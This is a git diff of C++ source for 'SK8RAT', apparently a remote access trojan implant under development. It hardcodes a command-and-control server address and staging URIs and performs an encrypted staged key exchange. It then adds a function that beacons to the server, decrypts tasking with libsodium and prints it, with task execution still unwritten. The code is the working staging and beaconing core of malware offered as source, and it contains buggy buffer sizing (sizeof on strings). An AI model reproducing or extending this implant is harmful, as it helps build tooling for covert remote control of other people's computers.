@@ -7,21 +7,21 @@
 #include <atlconv.h>
 using json = nlohmann::json;
 
+// Global variables: ip/hostname, port, stage0 uri, stage1 uri, stage2 uri, stage3 uri, beacon uri
+// listener_id, symetric key, sleep, jitter
+std::string server_ip = "192.168.1.50";
+std::string stage0_uri = "/stage0";
+std::string stage1_uri = "/stage1";
+std::string stage2_uri = "/stage2";
+std::string stage3_uri = "/stage3";
+std::string beacon_uri = "/beaconing";
+int server_port = 5000;
+int listener_id = 1;
+int sleep = 1;
+int jitter = 10;
+
 void SK8RAT_EKE(unsigned char * &symmetrickey, std::string &sessioncookie) 
 {
-	// Variables we want to pass in eventually: ip/hostname, port, stage0 uri, stage1 uri, stage2 uri, stage3 uri, beacon uri
-	// listener_id, symetric key, sleep, jitter
-	std::string server_ip = "192.168.1.50";
-	std::string stage0_uri = "/stage0";
-	std::string stage1_uri = "/stage1";
-	std::string stage2_uri = "/stage2";
-	std::string stage3_uri = "/firstcheckin";
-	std::string beacon_uri = "/beaconing";
-	int server_port = 5000;
-	int listener_id = 1;
-	int sleep = 1;
-	int jitter = 10;
-
 	// Generate shared symetric key (eventually hardcode this)
 	unsigned char sharedkey[crypto_secretbox_KEYBYTES];
 	crypto_secretbox_keygen(sharedkey);
@@ -67,7 +67,7 @@ void SK8RAT_EKE(unsigned char * &symmetrickey, std::string &sessioncookie)
 		server_response.erase(server_response.find('"'));
 	}
 
-	// Recieve response and decrypt (may want to loop this for more resilient staging?)
+	// Recieve response and decrypt
 	std::string sessionkey_encrypted = base64_decode(server_response);
 	const unsigned char* csessionkey_encrypted = (const unsigned char *)sessionkey_encrypted.c_str();
 	unsigned char* sessionkey = new unsigned char[sizeof(sessionkey_encrypted)]; //USE DELETE() WHEN COMPLETE
@@ -220,7 +220,7 @@ void SK8RAT_EKE(unsigned char * &symmetrickey, std::string &sessioncookie)
 	std::string nonce_stage3_b64 = base64_encode(nonce_stage3, crypto_secretbox_NONCEBYTES);
 	std::string send_stage3 = nonce_stage3_b64 + ":" + ciphertext_stage3_b64;
 
-	// POST K[sk8rat_checkin] to /beaconingurl
+	// POST K[sk8rat_checkin] to /stage3
 	std::string server_response4 = "";
 	agent_post_cookie(server_ip, server_port, stage3_uri, ssessioncookie, send_stage3, server_response4);
 
@@ -241,44 +241,44 @@ void SK8RAT_EKE(unsigned char * &symmetrickey, std::string &sessioncookie)
 
 void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 {
-	// create an empty structure (null)
-	json j;
+	std::string encrypted_tasking = "";
+	agent_get_cookie(server_ip, server_port, beacon_uri, sessioncookie, encrypted_tasking);
+	
+	// Clean " at beginning and end bc flask ... also cleans \n
+	if (encrypted_tasking.at(0) == '"')
+	{
+		encrypted_tasking.erase(0, 1);
+		encrypted_tasking.erase(encrypted_tasking.find('"'));
+	}
+	//printf("%s\n", encrypted_tasking.c_str());
 
-	// add a number that is stored as double (note the implicit conversion of j to an object)
-	j["pi"] = 3.141;
+	// Parse server response
+	std::string nonce = base64_decode(encrypted_tasking.substr(0, encrypted_tasking.find(":")));
+	std::string ciphertext = base64_decode(encrypted_tasking.substr(encrypted_tasking.find(":") + 1));
+	const unsigned char* cnonce = (const unsigned char *)nonce.c_str();
+	const unsigned char* cciphertext = (const unsigned char *)ciphertext.c_str();
 
-	// add a Boolean that is stored as bool
-	j["happy"] = true;
+	// Decrypt server response with sessionkey
+	unsigned char* server_response = new unsigned char[sizeof(ciphertext)]; //USE DELETE() WHEN COMPLETE
+	if (crypto_secretbox_open_easy(server_response, cciphertext, size(ciphertext), cnonce, symmetrickey) != 0) {
+		printf("challenge-response decryption failed :(\n");
+		SleepJitter(sleep, jitter);
+		return; //exits and starts tasking loop again essentially
+	}
+	else
+	{
+		printf("Yolo!\n");
+	}
 
-	// add a string that is stored as std::string
-	j["name"] = "Niels";
+	// Parse json message
+	std::string sserver_response(reinterpret_cast<char*>(server_response));
+	printf("%s\n", sserver_response.c_str());
 
-	// add another null object by passing nullptr
-	j["nothing"] = nullptr;
+	// Loop through and perform all tasking
 
-	// add an object inside the object
-	j["answer"]["everything"] = 42;
-
-	// add an array that is stored as std::vector (using an initializer list)
-	j["list"] = { 1, 0, 2 };
-
-	// add another object (using an initializer list of pairs)
-	j["object"] = { {"currency", "USD"}, {"value", 42.99} };
-
-	// instead, you could also write (which looks very similar to the JSON above)
-	json j2 = {
-	  {"justin", 1234},
-	  {"fucking", true},
-	  {"rocks", "Niels"},
-	  {"yeah", nullptr},
-	};
-	std::string j_string = j.dump();
-	std::string j2_string = j2.dump();
-	printf("%s\n%s\n", j_string.c_str(), j2_string.c_str());
-	json j3 = j;
-	j3.update(j2);
-	std::string j3_string = j3.dump();
-	printf("%s\n", j3_string.c_str());
+	
+	// Clean-up dynamically allocated heap
+	delete(server_response);
 }
 
 int main(int argc, char **argv)
@@ -289,7 +289,10 @@ int main(int argc, char **argv)
 	std::string sessioncookie = "";
 	SK8RAT_EKE(symmetrickey, sessioncookie); 
 	
-	// Begin tasking loop
+	// Allow time for server for database writes
+	Sleep(6000);
+
+	// Begin tasking loop, you will infinite loop this
 	SK8RAT_tasking(symmetrickey, sessioncookie);
 	
 
